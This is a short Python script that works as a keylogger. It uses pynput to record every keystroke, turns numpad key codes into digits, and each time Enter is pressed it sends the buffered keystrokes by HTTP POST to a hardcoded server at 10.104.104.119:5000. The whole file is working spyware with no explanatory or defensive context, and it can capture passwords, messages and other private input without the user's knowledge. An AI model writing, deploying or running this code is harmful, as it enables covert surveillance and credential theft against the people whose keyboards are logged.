from pynput.keyboard import Listener, Key
import requests, re

server_url = 'http://10.104.104.119:5000/get_logs'
logs = ''

def on_press(key):
    global logs

    if key == Key.enter:
        try:
            requests.post(server_url, data={'logs': logs})
        except:
            print('Server error!')
        logs = ''
    else:
        temp = str(key).replace("'","")
        if not temp.find('Key'):
            temp = ' '+temp+' '
        elif '<' in temp and '>' in temp:
            num = int(re.findall("\d+", temp)[0]) - 96
            if num in range(10):
                temp = str(num)

        logs += temp

with Listener(on_press=on_press) as listener:
    listener.join()
